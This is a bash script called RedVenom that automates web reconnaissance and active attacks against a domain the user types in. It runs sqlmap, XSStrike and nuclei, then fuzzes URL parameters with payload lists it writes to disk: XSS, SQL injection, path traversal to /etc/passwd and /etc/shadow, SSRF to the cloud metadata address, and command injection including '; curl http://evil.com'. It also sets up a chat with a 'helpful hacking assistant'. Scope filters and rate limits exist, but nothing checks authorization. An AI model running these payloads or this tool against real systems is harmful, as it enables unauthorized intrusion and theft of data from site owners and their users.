#!/bin/bash

# RedVenom v2.2 — Aggressive Web Recon & Attack Automation Tool
# Created by: Abdallah Yasser

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'
YELLOW='\033[1;33m'


echo -e "${RED}"
echo "██████╗ ███████╗██████╗ ██╗   ██╗███████╗███╗   ███╗ ██████╗ ███╗   ███╗"
echo "██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝████╗ ████║██╔═══██╗████╗ ████║"
echo "██████╔╝█████╗  ██████╔╝██║   ██║█████╗  ██╔████╔██║██║   ██║██╔████╔██║"
echo "██╔═══╝ ██╔══╝  ██╔═══╝ ██║   ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╔╝██║"
echo "██║     ███████╗██║     ╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚═╝ ██║"
echo "╚═╝     ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
echo -e "${NC}"
echo -e "${CYAN}🔗 Created by Abdallah Yasser | RedVenom v2.2${NC}"
echo "==================================================================="

resolve_concurrency_limit() {
    local setting_name="$1"
    local requested="$2"
    local default_value="$3"
    local maximum="$4"
    local numeric_value

    if [[ ! "$requested" =~ ^[0-9]+$ ]] || (( ${#requested} > 2 )); then
        echo -e "${YELLOW}[!] $setting_name must be an integer; using default $default_value.${NC}" >&2
        printf '%s\n' "$default_value"
        return
    fi

    numeric_value=$((10#$requested))
    if (( numeric_value < 1 || numeric_value > maximum )); then
        echo -e "${YELLOW}[!] $setting_name must be between 1 and $maximum; using default $default_value.${NC}" >&2
        printf '%s\n' "$default_value"
        return
    fi

    printf '%s\n' "$numeric_value"
}

# Per-stage limits are tunable but remain bounded to protect targets and the host.
MAX_XS_JOBS=$(resolve_concurrency_limit "REDVENOM_MAX_XS_JOBS" "${REDVENOM_MAX_XS_JOBS:-4}" 4 10)
MAX_JOBS=$(resolve_concurrency_limit "REDVENOM_MAX_FUZZ_JOBS" "${REDVENOM_MAX_FUZZ_JOBS:-5}" 5 20)

manage_jobs() {
    while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do
        sleep 0.5
    done
}
# === TOOL AUTO-DETECTOR (RedVenom v3) ===

SUBFINDER_CMD=$(command -v subfinder 2>/dev/null)
[[ -z "$SUBFINDER_CMD" ]] && echo -e "${YELLOW}[!] subfinder not found. Recon will be limited.${NC}"

HTTPX_CMD=$(command -v httpx 2>/dev/null)
[[ -z "$HTTPX_CMD" ]] && echo -e "${YELLOW}[!] httpx not found. Subdomain probing skipped.${NC}"

GAU_CMD=$(command -v gau 2>/dev/null)
[[ -z "$GAU_CMD" ]] && echo -e "${YELLOW}[!] gau not found. Historical URLs skipped.${NC}"

PARAMSPIDER_CMD=$(command -v paramspider 2>/dev/null)
[[ -z "$PARAMSPIDER_CMD" ]] && echo -e "${YELLOW}[!] paramspider not found. Param discovery limited.${NC}"

ARJUN_CMD=$(command -v arjun 2>/dev/null)
[[ -z "$ARJUN_CMD" ]] && echo -e "${YELLOW}[!] arjun not found. Hidden param fuzzing skipped.${NC}"

SQLMAP_CMD=$(command -v sqlmap 2>/dev/null)
[[ -z "$SQLMAP_CMD" ]] && echo -e "${YELLOW}[!] sqlmap not found. SQLi scan disabled.${NC}"

XSSTRIKE_CMD=$(command -v xsstrike 2>/dev/null)
[[ -z "$XSSTRIKE_CMD" ]] && [[ -f "XSStrike/xsstrike.py" ]] && XSSTRIKE_CMD="python3 XSStrike/xsstrike.py"
[[ -z "$XSSTRIKE_CMD" ]] && echo -e "${YELLOW}[!] XSStrike not found. XSS scan disabled.${NC}"

NUCLEI_CMD=$(command -v nuclei 2>/dev/null)
[[ -z "$NUCLEI_CMD" ]] && echo -e "${YELLOW}[!] nuclei not found. Passive scanning skipped.${NC}"
# Fail before prompts or network activity when required dependencies are missing.
python3 scripts/preflight.py
PREFLIGHT_STATUS=$?
if [[ "$PREFLIGHT_STATUS" -ne 0 ]]; then
    echo -e "${RED}[-] Dependency preflight failed. See the messages above.${NC}"
    exit "$PREFLIGHT_STATUS"
fi

# Version compare helper
version_gt() {
    test "$(printf '%s\n' "$@" | sort -V | head -n 1)" != "$1"
}



openrouter_chat_completion() {
    local api_key="$1"
    local system_message="$2"
    local user_message="$3"
    local request_body

    request_body=$(jq -n \
        --arg model "mistralai/mistral-7b-instruct" \
        --arg system "$system_message" \
        --arg user "$user_message" \
        '{
            model: $model,
            messages: [
                {role: "system", content: $system},
                {role: "user", content: $user}
            ]
        }') || return 1

    "$CURL_CMD" --fail --silent --show-error \
        --connect-timeout 10 --max-time 60 \
        -H "Authorization: Bearer $api_key" \
        -H "Content-Type: application/json" \
        --data-binary "$request_body" \
        https://openrouter.ai/api/v1/chat/completions
}

ask_ai() {
    API_KEY=$(cat "$HOME/.openrouter_key" 2>/dev/null)
    if [[ -z "$API_KEY" ]]; then
        echo -e "${RED}[-] No OpenRouter API key found in $HOME/.openrouter_key${NC}"
        return
    fi

    echo -e "${CYAN}[*] Starting RedVenom AI session. Type 'exit' to quit.${NC}"

    while true; do
        read -r -p "[AI] ➤ " USER_QUERY
        [[ "$USER_QUERY" == "exit" ]] && echo -e "${CYAN}[*] Ending RedVenom AI session.${NC}" && break
        [[ -z "$USER_QUERY" ]] && continue

        if ! RESPONSE=$(openrouter_chat_completion "$API_KEY" "You are RedVenom AI, a helpful hacking assistant." "$USER_QUERY"); then
            echo -e "${RED}[-] OpenRouter request failed or timed out. No report was written.${NC}"
            continue
        fi

        MESSAGE=$(printf '%s' "$RESPONSE" | jq -r '.choices[0].message.content // empty')
        if [[ -z "$MESSAGE" ]]; then
            echo -e "${RED}[-] OpenRouter returned an unexpected response shape.${NC}"
        else
            echo -e "${GREEN}[AI]:${NC} $MESSAGE"
        fi
    done
}

summarize_results() {
    echo -e "${CYAN}[*] Generating AI summary from scan results...${NC}"

    API_KEY=$(cat "$HOME/.openrouter_key" 2>/dev/null)
    [[ -z "$API_KEY" ]] && echo -e "${RED}[-] No OpenRouter API key found.${NC}" && return

    XSSTRIKE_SUMMARY=$(head -c 3000 "${RUN_DIR}/xsstrike_results.txt" 2>/dev/null)
    SQLMAP_SUMMARY=$(find "${RUN_DIR}/sqlmap_results" -name "*.csv" -exec head -c 3000 {} + 2>/dev/null)
    FUZZ_LOG=$(grep -E '\[XSS\]|\[SQLi\]|\[LFI\]|\[JSONi\]' "${RUN_DIR}/fuzzing_log.txt" 2>/dev/null | head -c 3000)
    NUCLEI=$(head -c 3000 "${RUN_DIR}/candidates/nuclei/nuclei_candidates.tsv" 2>/dev/null)

    PROMPT=$(printf 'Summarize and prioritize these exploratory security scan observations. Treat scanner alerts as leads that require human verification. Do not claim exploitability unless supported by the supplied evidence.\n\n[XSStrike]:\n%s\n\n[SQLMap]:\n%s\n\n[Fuzzing]:\n%s\n\n[Nuclei]:\n%s' "$XSSTRIKE_SUMMARY" "$SQLMAP_SUMMARY" "$FUZZ_LOG" "$NUCLEI")

    if ! RESPONSE=$(openrouter_chat_completion "$API_KEY" "You are a careful application-security reviewer. Clearly separate observations from confirmed findings and identify missing evidence." "$PROMPT"); then
        echo -e "${RED}[-] OpenRouter request failed or timed out. No report was written.${NC}"
        return 1
    fi

    SUMMARY=$(printf '%s' "$RESPONSE" | jq -r '.choices[0].message.content // empty')
    if [[ -z "$SUMMARY" ]]; then
        echo -e "${RED}[-] OpenRouter returned no summary content. No report was written.${NC}"
        return 1
    fi

    printf "\n%s\n" "${GREEN}[+] AI Summary Report:${NC}"
    printf '%s\n' "$SUMMARY"

    printf '%s\\n' "$SUMMARY" > "${RUN_DIR}/ai_report.txt"
    echo -e "${CYAN}[✔] Saved to ${RUN_DIR}/ai_report.txt${NC}"
}




read -p "[?] Enter the target domain (e.g. example.com): " TARGET

TARGET=$(python3 scripts/validate_target.py --target "$TARGET") || {
    echo -e "${RED}[-] Invalid target. Enter a bare DNS hostname or IP address, without a scheme, port, path, or wildcard.${NC}"
    exit 2
}
read -p "[?] Do you want to enable VPN? (y/n): " VPN_OPTION

# Give every invocation a unique artifact directory; never reuse or purge prior results.
RUN_ID="$(date -u +%Y%m%dT%H%M%SZ)-${BASHPID}"
RUN_DIR="recon_venom/runs/${RUN_ID}"
PAYLOAD_DIR="${RUN_DIR}/payloads"
mkdir -p "$RUN_DIR" "$PAYLOAD_DIR"

VPN_PID_FILE="${RUN_DIR}/openvpn.pid"
VPN_STARTED_BY_REDVENOM=0

cleanup_vpn() {
    if [[ "${VPN_STARTED_BY_REDVENOM:-0}" -ne 1 || ! -s "${VPN_PID_FILE:-}" ]]; then
        return
    fi

    local vpn_pid=""
    IFS= read -r vpn_pid < "$VPN_PID_FILE" || true
    if [[ ! "$vpn_pid" =~ ^[0-9]+$ ]]; then
        echo -e "${YELLOW}[!] VPN PID file is invalid; leaving processes untouched.${NC}"
        return
    fi

    local process_name=""
    process_name=$(ps -p "$vpn_pid" -o comm= 2>/dev/null | tr -d '[:space:]')
    if [[ "$process_name" == "openvpn" ]]; then
        echo -e "${CYAN}[*] Stopping the OpenVPN process started by this run (PID $vpn_pid)...${NC}"
        sudo kill "$vpn_pid" || echo -e "${YELLOW}[!] Could not stop OpenVPN PID $vpn_pid.${NC}"
        for _ in {1..10}; do
            sudo kill -0 "$vpn_pid" 2>/dev/null || break
            sleep 1
        done
    fi

    rm -f "$VPN_PID_FILE"
}
trap cleanup_vpn EXIT

# PHASE 1 — VPN (Optional)
if [[ "$VPN_OPTION" == "y" ]]; then
    if pgrep -x openvpn >/dev/null 2>&1; then
        echo -e "${GREEN}[+] An OpenVPN process is already running; RedVenom will leave it untouched.${NC}"
    elif [[ ! -r "$HOME/vpn-config.ovpn" ]]; then
        echo -e "${RED}[-] VPN config not found or unreadable: $HOME/vpn-config.ovpn${NC}"
        exit 1
    else
        echo -e "${CYAN}[*] Starting a run-owned OpenVPN daemon...${NC}"
        if ! sudo openvpn --config "$HOME/vpn-config.ovpn" --daemon --writepid "$VPN_PID_FILE"; then
            echo -e "${RED}[-] OpenVPN failed to start.${NC}"
            exit 1
        fi

        for _ in {1..15}; do
            if [[ -s "$VPN_PID_FILE" ]]; then
                candidate_pid=""
                IFS= read -r candidate_pid < "$VPN_PID_FILE" || true
                if [[ "$candidate_pid" =~ ^[0-9]+$ ]] && sudo kill -0 "$candidate_pid" 2>/dev/null; then
                    VPN_STARTED_BY_REDVENOM=1
                    break
                fi
            fi
            sleep 1
        done

        if [[ "$VPN_STARTED_BY_REDVENOM" -ne 1 ]]; then
            echo -e "${RED}[-] OpenVPN did not create a verifiable PID file. Refusing to claim ownership.${NC}"
            exit 1
        fi
        echo -e "${GREEN}[+] Run-owned OpenVPN process started.${NC}"
    fi
else
    echo -e "${CYAN}[*] VPN skipped by user.${NC}"
fi

mkdir -p "$RUN_DIR"

# PHASE 2 — Enhanced Recon (RedVenom v3)
# Detect required tools
SUBFINDER_CMD=$(command -v subfinder)
HTTPX_CMD=$(command -v httpx)
GAU_CMD=$(command -v gau)
PARAMSPIDER_CMD=$(command -v paramspider)
ARJUN_CMD=$(command -v arjun)
CURL_CMD=$(command -v curl)

echo -e "${CYAN}[+] Preparing isolated run directory...${NC}"
mkdir -p "$RUN_DIR" "$PAYLOAD_DIR" "${RUN_DIR}/js" "${RUN_DIR}/params" "${RUN_DIR}/candidates" "${RUN_DIR}/nuclei_results"

if [[ -n "$SUBFINDER_CMD" ]]; then
    echo -e "${CYAN}[*] Running Subfinder...${NC}"
    $SUBFINDER_CMD -d "$TARGET" -silent -o ${RUN_DIR}/subdomains.txt & PID1=$!
else
    echo -e "${RED}[-] Subfinder not found. Skipping.${NC}"
    PID1=""
fi

if [[ -n "$GAU_CMD" ]]; then
    echo -e "${CYAN}[*] Running gau...${NC}"
    $GAU_CMD --subs --o ${RUN_DIR}/gau_urls.txt "$TARGET" & PID2=$!
else
    echo -e "${RED}[-] gau not found. Skipping.${NC}"
    PID2=""
fi

[[ -n "$PID1" ]] && wait $PID1

# Enforce the selected root-domain boundary on discovered hostnames before probing.
python3 scripts/filter_scope.py --root "$TARGET" --input ${RUN_DIR}/subdomains.txt --output ${RUN_DIR}/subdomains.scoped.txt || exit 1
mv ${RUN_DIR}/subdomains.scoped.txt ${RUN_DIR}/subdomains.txt
if [[ -n "$HTTPX_CMD" ]]; then
    echo -e "${CYAN}[*] Running httpx...${NC}"
    HTTPX_VERSION=$($HTTPX_CMD -version 2>/dev/null | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+' || echo "0.0.0")

    if version_gt "$HTTPX_VERSION" "1.2.9"; then
        if [[ -s ${RUN_DIR}/subdomains.txt ]]; then
            $HTTPX_CMD -l ${RUN_DIR}/subdomains.txt -silent -o ${RUN_DIR}/httpx_live.txt & PID3=$!
        else
            echo -e "${RED}[-] No subdomains found to probe with httpx.${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Old httpx detected. Falling back to stdin mode.${NC}"
        if [[ -s ${RUN_DIR}/subdomains.txt ]]; then
            cat ${RUN_DIR}/subdomains.txt | $HTTPX_CMD -silent > ${RUN_DIR}/httpx_live.txt & PID3=$!
        else
            echo -e "${RED}[-] No subdomains found for fallback stdin httpx.${NC}"
        fi
    fi
else
    echo -e "${RED}[-] httpx not found. Skipping.${NC}"
    PID3=""
fi



[[ -n "$PID2" ]] && wait $PID2
[[ -n "$PID3" ]] && wait $PID3

# Normalize empty tool outputs so a clean discovery miss does not abort filtering.
touch ${RUN_DIR}/subdomains.txt ${RUN_DIR}/httpx_live.txt ${RUN_DIR}/gau_urls.txt

# Filter discovered live hosts and archived URLs before follow-on requests.
python3 scripts/filter_scope.py --root "$TARGET" --input ${RUN_DIR}/httpx_live.txt --output ${RUN_DIR}/httpx_live.scoped.txt || exit 1
mv ${RUN_DIR}/httpx_live.scoped.txt ${RUN_DIR}/httpx_live.txt
python3 scripts/filter_scope.py --root "$TARGET" --input ${RUN_DIR}/gau_urls.txt --output ${RUN_DIR}/gau_urls.scoped.txt || exit 1
mv ${RUN_DIR}/gau_urls.scoped.txt ${RUN_DIR}/gau_urls.txt


echo -e "${CYAN}[*] Running ParamSpider...${NC}"
RAW_OUTPUT="${RUN_DIR}/params/paramspider_raw.txt"
CLEAN_OUTPUT="${RUN_DIR}/params/paramspider_cleaned.txt"
> "$RAW_OUTPUT"
> "$CLEAN_OUTPUT"
if [[ ! -s ${RUN_DIR}/httpx_live.txt ]]; then
    echo -e "${RED}[-] No live subdomains found. Skipping ParamSpider.${NC}"
else
    echo -e "${CYAN}[*] Running ParamSpider...${NC}"

while read -r domain; do
    [[ -z "$domain" ]] && continue
    $PARAMSPIDER_CMD -d "$domain" \
        --quiet \
        --exclude woff,ttf,svg,png,jpg,jpeg,gif,css,js,ico,bmp,webp \
        2>/dev/null >> "$RAW_OUTPUT"
done < ${RUN_DIR}/httpx_live.txt

grep -Eo 'https?://[^ ]+\?[^ ]+' "$RAW_OUTPUT" | sort -u > "$CLEAN_OUTPUT"
echo -e "${GREEN}[✔] ParamSpider output saved to:${NC} $CLEAN_OUTPUT"
fi

# Hidden Parameter Discovery via Arjun
echo -e "${CYAN}[*] Running Arjun for hidden parameter discovery...${NC}"
$ARJUN_CMD -i ${RUN_DIR}/httpx_live.txt -oT ${RUN_DIR}/params/arjun_params.txt -t 20 2>/dev/null

# JavaScript link extraction (filtered by target domain)
echo -e "${CYAN}[*] Finding JS files from gau output...${NC}"

mkdir -p "${RUN_DIR}/js"
touch "${RUN_DIR}/js/js_files.txt"

if [[ ! -s ${RUN_DIR}/gau_urls.txt ]]; then
    echo -e "${RED}[-] gau output not found. Skipping JS file extraction.${NC}"
else
    grep -Ei '\.js($|\?)' ${RUN_DIR}/gau_urls.txt | grep "$TARGET" | sort -u > ${RUN_DIR}/js/js_files.txt
fi

echo -e "${CYAN}[*] Extracting endpoints from JS files (filtered)...${NC}"
> ${RUN_DIR}/js/endpoints.txt
while read -r jsurl; do
    $CURL_CMD -sk "$jsurl" | grep -Eo '[a-zA-Z0-9_\/.-]+?\.(php|asp|aspx|jsp|json|cgi)' >> ${RUN_DIR}/js/endpoints.txt
done < ${RUN_DIR}/js/js_files.txt
sort -u ${RUN_DIR}/js/endpoints.txt -o ${RUN_DIR}/js/endpoints.txt


# Merge Everything
echo -e "${CYAN}[*] Merging URLs for final list...${NC}"
cat ${RUN_DIR}/gau_urls.txt \
    ${RUN_DIR}/params/paramspider_cleaned.txt \
    ${RUN_DIR}/js/endpoints.txt \
    ${RUN_DIR}/params/arjun_params.txt 2>/dev/null | sort -u > ${RUN_DIR}/all_urls.txt

# Optional Filtering
read -p "[?] Do you want full filtered output (only dynamic pages with params)? (y/n): " FILTER_OPTION
if [[ "$FILTER_OPTION" == "y" ]]; then
    echo -e "${CYAN}[*] Filtering for dynamic URLs only (.php, .asp, .jsp, .cgi)...${NC}"
    grep '?' ${RUN_DIR}/all_urls.txt | grep -Ei '\.php|\.asp|\.aspx|\.jsp|\.cgi' \
      | grep -vE '\.(js|css|png|jpg|jpeg|gif|svg|woff|ttf)' \
      | sort -u > ${RUN_DIR}/all_cleaned_urls.txt
else
    echo -e "${CYAN}[*] Using all parameterized URLs without filtering...${NC}"
    grep '?' ${RUN_DIR}/all_urls.txt | sort -u > ${RUN_DIR}/all_cleaned_urls.txt
fi

echo -e "${GREEN}[✔] Recon phase complete. Output in:${NC} ${RUN_DIR}/all_cleaned_urls.txt"

# Final defense-in-depth filter before active scanners and fuzzers.
python3 scripts/filter_scope.py --root "$TARGET" --input ${RUN_DIR}/all_cleaned_urls.txt --output ${RUN_DIR}/all_cleaned_urls.scoped.txt || exit 1
mv ${RUN_DIR}/all_cleaned_urls.scoped.txt ${RUN_DIR}/all_cleaned_urls.txt


#sqlmap+xsstrike phase
SQLMAP_CMD=$(command -v sqlmap)

echo -e "${CYAN}[*] Running SQLMap...${NC}"
$SQLMAP_CMD -m ${RUN_DIR}/all_cleaned_urls.txt --batch --random-agent --output-dir=${RUN_DIR}/sqlmap_results

echo -e "${CYAN}[*] Running XSStrike on each URL...${NC}"

manage_xs_jobs() {
    while [ "$(jobs -rp | wc -l)" -ge "$MAX_XS_JOBS" ]; do
        sleep 0.5
    done
}

> ${RUN_DIR}/xsstrike_raw.txt
> ${RUN_DIR}/xsstrike_results_clean.txt
> ${RUN_DIR}/xsstrike_candidates.txt

while read -r url; do
    [[ -z "$url" ]] && continue
    manage_xs_jobs
    {
        echo -e "${CYAN}[XSStrike] Testing: $url${NC}"
        XS_TEMP=$(mktemp)
        $XSSTRIKE_CMD -u "$url" --skip --crawl 2>&1 | tee "$XS_TEMP" >> ${RUN_DIR}/xsstrike_raw.txt

        if grep -iqE 'Payload:|Injection successful|reflected|context|alert|XSS' "$XS_TEMP"; then
            PAYLOAD=$(grep -i 'Payload:' "$XS_TEMP" | head -n 1 | cut -d':' -f2- | xargs)
            [[ -z "$PAYLOAD" ]] && PAYLOAD=$(grep -i 'Injection successful' "$XS_TEMP" | head -n 1 || echo "Generic XSS")

            echo "$url [CANDIDATE - VERIFY] → $PAYLOAD" | tee -a ${RUN_DIR}/xsstrike_results_clean.txt ${RUN_DIR}/xsstrike_candidates.txt
        else
            echo "$url [No candidate matched - NOT A CLEAN BILL OF HEALTH]" >> ${RUN_DIR}/xsstrike_results_clean.txt
        fi

        rm -f "$XS_TEMP"
    } &
done < ${RUN_DIR}/all_cleaned_urls.txt

wait
echo -e "${GREEN}[+] Cleaned XSStrike results saved in:${NC}"
echo -e "${CYAN}    - ${RUN_DIR}/xsstrike_results_clean.txt"
echo -e "${CYAN}    - ${RUN_DIR}/xsstrike_candidates.txt"
echo -e "${CYAN}    - ${RUN_DIR}/xsstrike_raw.txt${NC}"

echo -e "${GREEN}[+] Scanning phase complete.${NC}"



# PHASE 4 — Fuzzing (XSS, SQLi, LFI, Redirect, SSTI, RCE, JSONi, SSRF)
echo -e "${CYAN}[*] Preparing payload files and candidate folder...${NC}"
mkdir -p "$PAYLOAD_DIR" "${RUN_DIR}/candidates"

# Payload sets

cat > ${PAYLOAD_DIR}/xss.txt <<'EOF'
"><svg/onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
"><iframe src=javascript:alert(1)>
"><body onload=alert(1)>
"><scr<script>ipt>alert(1)</scr</script>ipt>
"><details/open/ontoggle=alert(1)>
"><marquee/onstart=alert(1)>
EOF


cat > ${PAYLOAD_DIR}/sqli.txt << 'EOF'
' OR 1=1 --
" OR "1"="1
admin' --
' OR sleep(5)-- 
' AND '1'='1
' or 1=1 limit 1; --
EOF

cat > ${PAYLOAD_DIR}/lfi.txt << 'EOF'
../../../../etc/passwd
../../../../../../etc/shadow
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
../../../boot.ini
EOF

cat > ${PAYLOAD_DIR}/open_redirect.txt << 'EOF'
http://evil.com
https://evil.com
//evil.com
//google.com%2F%2F@evil.com
/?next=http://evil.com
EOF

cat > ${PAYLOAD_DIR}/ssrf.txt << 'EOF'
http://127.0.0.1
http://localhost
http://169.254.169.254
http://[::1]
http://0.0.0.0
EOF

cat > ${PAYLOAD_DIR}/rce.txt << 'EOF'
;ls
| whoami
&& cat /etc/passwd
; ping -c 1 127.0.0.1
; curl http://evil.com
EOF

cat > ${PAYLOAD_DIR}/ssti.txt << 'EOF'
{{7*7}}
{{1337*1337}}
\${7*7}
\${{7*7}}
<%= 7 * 7 %>
EOF

cat > ${PAYLOAD_DIR}/json.txt << 'EOF'
{"username":"admin","password":"' OR '1'='1"}
{"user":"\${7*7}"}
{"input":"<script>alert(1)</script>"}
{"path":"../../../../etc/passwd"}
{"redirect":"http://evil.com"}
{"cmd":"__import__('os').system('id')"}
EOF

# Heuristic candidate classification (human verification required)
detect_vuln() {
    local url="$1"
    local payload="$2"
    local type="$3"
    response=$($CURL_CMD -sk "$url" --max-time 10)

    case "$type" in
        "XSS")
            if echo "$response" | grep -qE '<script>alert\(1\)</script>|<svg/onload=alert\(1\)>|onerror=alert'; then
                echo -e "${GREEN}[CANDIDATE - VERIFY][XSS] $url${NC}" | tee -a ${RUN_DIR}/candidates/xss.txt
            fi ;;
        "SQLi")
            if echo "$response" | grep -qE 'SQL syntax|mysql_fetch|syntax error|unterminated query'; then
                echo -e "${GREEN}[CANDIDATE - VERIFY][SQLi] $url${NC}" | tee -a ${RUN_DIR}/candidates/sqli.txt
            fi ;;
        "LFI")
            if echo "$response" | grep -qE 'root:.*:0:0|boot.ini'; then
                echo -e "${GREEN}[CANDIDATE - VERIFY][LFI] $url${NC}" | tee -a ${RUN_DIR}/candidates/lfi.txt
            fi ;;
        "Redirect")
            if echo "$response" | grep -qi "Location: http://evil.com"; then
                echo -e "${GREEN}[CANDIDATE - VERIFY][Redirect] $url${NC}" | tee -a ${RUN_DIR}/candidates/redirect.txt
            fi ;;
        "RCE")
            if echo "$response" | grep -qE 'uid=|root|Administrator'; then
                echo -e "${GREEN}[CANDIDATE - VERIFY][RCE] $url${NC}" | tee -a ${RUN_DIR}/candidates/rce.txt
            fi ;;
        "SSTI")
            if echo "$response" | grep -qE '49|1787569'; then
                echo -e "${GREEN}[CANDIDATE - VERIFY][SSTI] $url${NC}" | tee -a ${RUN_DIR}/candidates/ssti.txt
            fi ;;
        "JSON")
            if echo "$response" | grep -qE 'alert\(1\)|root:|uid=|error'; then
                echo -e "${GREEN}[CANDIDATE - VERIFY][JSONi] $url -- Payload: $payload${NC}" | tee -a ${RUN_DIR}/candidates/jsoni.txt
            fi ;;
    esac
}

# Control job limit
manage_jobs() {
    while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do
        sleep 0.3
    done
}

echo -e "${GREEN}[+] Payloads loaded. Starting Fuzzing Phase...${NC}"

mapfile -t XSS_PAYLOADS < ${PAYLOAD_DIR}/xss.txt
mapfile -t SQLI_PAYLOADS < ${PAYLOAD_DIR}/sqli.txt
mapfile -t LFI_PAYLOADS < ${PAYLOAD_DIR}/lfi.txt
mapfile -t REDIRECT_PAYLOADS < ${PAYLOAD_DIR}/open_redirect.txt
mapfile -t SSRF_PAYLOADS < ${PAYLOAD_DIR}/ssrf.txt
mapfile -t RCE_PAYLOADS < ${PAYLOAD_DIR}/rce.txt
mapfile -t SSTI_PAYLOADS < ${PAYLOAD_DIR}/ssti.txt
mapfile -t JSON_PAYLOADS < ${PAYLOAD_DIR}/json.txt

while read -r url; do
    for payload in "${XSS_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "XSS" & manage_jobs
    done

    for payload in "${SQLI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "SQLi" & manage_jobs
    done

    for payload in "${LFI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "LFI" & manage_jobs
    done

    for payload in "${REDIRECT_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "Redirect" & manage_jobs
    done

    for payload in "${SSRF_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        echo -e "[SSRF] $fuzzed" | tee -a ${RUN_DIR}/fuzzing_log.txt
        $CURL_CMD -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${RCE_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "RCE" & manage_jobs
    done

    for payload in "${SSTI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "SSTI" & manage_jobs
    done

    for payload in "${JSON_PAYLOADS[@]}"; do
        echo -e "[JSON] $url -- POST Payload: $payload" | tee -a ${RUN_DIR}/fuzzing_log.txt
        response=$($CURL_CMD -sk -X POST -H "Content-Type: application/json" -d "$payload" "$url")
        detect_vuln "$url" "$payload" "JSON"
    done

done < ${RUN_DIR}/all_cleaned_urls.txt

wait
echo -e "${GREEN}[✔] Fuzzing phase complete. Candidate observations saved in: ${RUN_DIR}/candidates/${NC}"

# PHASE 5 — Nuclei scanning and candidate extraction
echo -e "${CYAN}[*] Launching Nuclei scanning...${NC}"
mkdir -p "${RUN_DIR}/nuclei_results" "${RUN_DIR}/candidates/nuclei"

if [[ -n "$NUCLEI_CMD" ]]; then
    echo -e "${CYAN}[*] Running Nuclei scan...${NC}"
    (
        set -o pipefail
        "$NUCLEI_CMD" -l "${RUN_DIR}/all_cleaned_urls.txt" -o "${RUN_DIR}/nuclei_results/raw.txt" -json \
            | tee "${RUN_DIR}/nuclei_results/live_output.txt"
    ) &
    NUCLEI_PID=$!
    echo -e "${CYAN}[~] Nuclei scan running in background... this may take a while.${NC}"

    # Wait for the scanner pipeline to finish before reading its JSONL output.
    if ! wait "$NUCLEI_PID"; then
        echo -e "${YELLOW}[!] Nuclei exited with an error; parsing any output it produced.${NC}"
    fi
    NUCLEI_PID=""

    if [[ -s "${RUN_DIR}/nuclei_results/raw.txt" ]]; then
        if python3 scripts/parse_nuclei_jsonl.py \
            --input "${RUN_DIR}/nuclei_results/raw.txt" \
            --output "${RUN_DIR}/candidates/nuclei/nuclei_candidates.tsv"; then
            echo -e "${GREEN}[+] Nuclei candidate observations saved to ${RUN_DIR}/candidates/nuclei/nuclei_candidates.tsv${NC}"
        else
            echo -e "${YELLOW}[!] Could not parse Nuclei output; raw JSONL was preserved.${NC}"
        fi
    else
        echo -e "${CYAN}[*] Nuclei produced no raw JSONL output to parse.${NC}"
    fi
else
    echo -e "${YELLOW}[!] Nuclei not found. Skipping this optional stage.${NC}"
fi


# Offer AI Assistant or Summary
echo -e "${CYAN}[✔] All scan phases complete.${NC}"

ai_menu() {
    echo -e "\n${CYAN}[!] RedVenom AI Options:${NC}"
    echo "   1) Ask the AI Assistant"
    echo "   2) Summarize Findings"
    echo "   3) Skip"

    while true; do
        read -p "[?] Choose (1/2/3): " choice
        case "$choice" in
            1) ask_ai ;;
            2) summarize_results ;;
            3) break ;;
            *) echo -e "${RED}[-] Invalid option.${NC}" ;;
        esac
    done
}

ai_menu


# PHASE 6 — Cleanup
cleanup_vpn
trap - EXIT

echo -e "${GREEN}[✔] RedVenom v3 finished. Results saved in ${RUN_DIR}/.${NC}"
